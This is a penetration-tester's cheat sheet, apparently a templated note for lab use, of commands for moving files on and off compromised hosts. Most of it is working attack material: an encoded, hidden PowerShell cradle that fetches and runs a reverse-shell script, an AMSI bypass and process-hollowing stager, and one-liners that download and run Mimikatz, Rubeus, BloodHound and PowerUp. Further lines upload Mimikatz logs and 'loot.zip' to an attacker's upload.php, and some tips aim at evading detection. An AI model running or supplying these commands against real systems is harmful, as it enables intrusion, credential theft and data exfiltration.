# Download And Upload Files

### Getting a reverse shell <a href="#getting-a-reverse-shell" id="getting-a-reverse-shell"></a>

Run this command once to generate the required Encoded command with the IP address.

```
$Command = "(New-Object System.Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/pwn.ps1') | IEX"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell -Sta -Nop -Window Hidden -EncodedCommand $EncodedCommand
```

Shells should be spawned using **pwn.ps1** and additional scripts will be edited inside **pwn.ps1**

```
Invoke-Expression(Invoke-WebRequest 'http://<% tp.frontmatter["Host IP"] %>/amsi.txt' -UseBasicParsing);
Invoke-Expression(Invoke-WebRequest 'http://<% tp.frontmatter["Host IP"] %>/Invoke-Sharpcradle.ps1' -UseBasicParsing);

# Invoke-Sharpcradle -Uri WebserverURI -Argument1 firstargument -Argument2 seccondargument -Argument3 thirdargument
# Invoke-Sharpcradle -Uri http://<% tp.frontmatter["Host IP"] %>/ParentHollowInjectStager.exe -Argument1 /port:443 -Argument2 /program:C:\windows\system32\notepad.exe -Argument3 /parent:spoolsv
```

#### Directories for writing files <a href="#directories-for-writting-files" id="directories-for-writting-files"></a>

```
# Inside meterpreter 
C:\\Windows\\Tasks
C:\\Windows\\Temp

# Inside Powershell/cmd
C:\Windows\Tasks
C:\Windows\Temp

# In linux
/dev/shm
/tmp
```

### Download and Upload <a href="#download-and-upload" id="download-and-upload"></a>

#### Download and Execute <a href="#download-and-execute" id="download-and-execute"></a>

**Certutil**

```
certutil -urlcache -f http://<% tp.frontmatter["Host IP"]%>/shell.exe shell.exe 
```

**PowerShell Download**

```
# Download and save shell to tasks
Invoke-WebRequest -Uri http://<% tp.frontmatter["Host IP"]%> -OutFile C:\Windows\Tasks\shell.exe;Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```

```
# PowerView/SharpView
iex(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/PowerView.ps1');DomainTrustMapping
Get-DomainComputer -Domain <Domain> | Resolve-IPAddress
iex(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/Invoke-SharpView.ps1')
# Obfuscated SharpView
iwr "http://<% tp.frontmatter["Host IP"] %>/ObfSharpView.exe" -outfile "C:\Windows\Tasks\ObfSharpView.exe"
```

```
# Get All Domains
$domains = @("domain1", "domain2", "domain3")
foreach ($domain in $domains) {Get-DomainComputer -Domain $domain | Resolve-IPAddress}
```

```
powershell -ep bypass
# PowerUp/SharpUp
iex(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/PowerUp.ps1');Invoke-AllChecks
iex(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/Invoke-SharpUp.ps1')

# Turtle Toolkit
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://<% tp.frontmatter["Host IP"] %>/TurtleToolKit.dll -UseBasicParsing).Content);Import-Module -Assembly $a

# Invoke-Bloodhound
iex(New-Object Net.WebClient).DownloadString('http://<% tp.frontmatter["Host IP"] %>/Invoke-Bloodhound.ps1')
Invoke-Bloodhound -CollectionMethod All -Domain demo.local -ZipFileName loot.zip -Verbose
# If bloodhound misses the sessions
Invoke-Bloodhound -CollectionMethod LoggedOn -Domain demo.local -ZipFileName loot.zip -Verbose
# To Avoid Detection from Advanced Threat Analytics
Invoke-BloodHound -CollectionMethod All -ExcludeDC -Verbose

# SharpHound.exe
iwr "http://<% tp.frontmatter["Host IP"] %>/SharpHound.exe" -outfile "C:\Windows\Tasks\SharpHound.exe"

# Mimikatz.exe
iwr "http://<% tp.frontmatter["Host IP"] %>/mimikatz.exe" -outfile "C:\Windows\Tasks\mimikatz.exe"

# Rubeus / Invoke-Rubeus / Obfuscated Rubeus
iwr "http://<% tp.frontmatter["Host IP"] %>/Rubeus.exe" -outfile "C:\Windows\Tasks\Rubeus.exe"

# Winpeas
iwr "http://<% tp.frontmatter["Host IP"] %>/winPEASany.exe" -outfile "C:\Windows\Tasks\winpeas.exe"
```

**FTP**

```
ftp $IP -P $PORT
```

```
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

```
C:\Users\offsec> ftp -v -n -s:ftp.txt
```

**SMB**

```
smbclient -L -U 'username' -P 'password' \\$IP\share
prompt OFF
recurse ON
mget *
```

```
poetry run crackmapexec smb $IP$ -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```

**SCP**

```
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
scp user@server:/path/to/remotefile.zip /Local/Target/Destination
scp user@host:/remote/path/\{file1.zip,file2.zip\} /Local/Path/
```

**MSSQL**

```
poetry run crackmapexec mssql $IP$ -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```

#### Downloading MultipleFiles <a href="#downloading-multiplefiles" id="downloading-multiplefiles"></a>

```
$baseUrl = "http://<% tp.frontmatter["Host IP"] %>/"
$fileNames = @("file1.txt", "file2.txt", "file3.txt")
$downloadPath = "C:\Windows\Tasks"

foreach ($file in $fileNames){
	$url = $baseUrl + $file
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $downloadPath
	Write-Host "[+] Downloaded" $file "to" $downloadPath
}
```

#### Upload files <a href="#upload-files" id="upload-files"></a>

**PowerShell Upload**

```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.161/upload.php', 'c:\Windows\Tasks\mimi.log')
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.161/upload.php', 'c:\Windows\Tasks\loot.zip')
```

**FTP**

```
put file.docx
```

**SMB**

```
impacket-smbserver monk . -smb2support
```

```
net use * \\<% tp.frontmatter["Host IP"] %>\monk
```

```
powershell run crackmapexec smb $IP$ -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
```

**SCP**

```
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
scp file.txt remote_username@10.10.0.2:/remote/directory
```

**MSSQL**

```
powershell run crackmapexec mssql $IP$ -u user -p pass --put-file /tmp/whoami.txt 
```
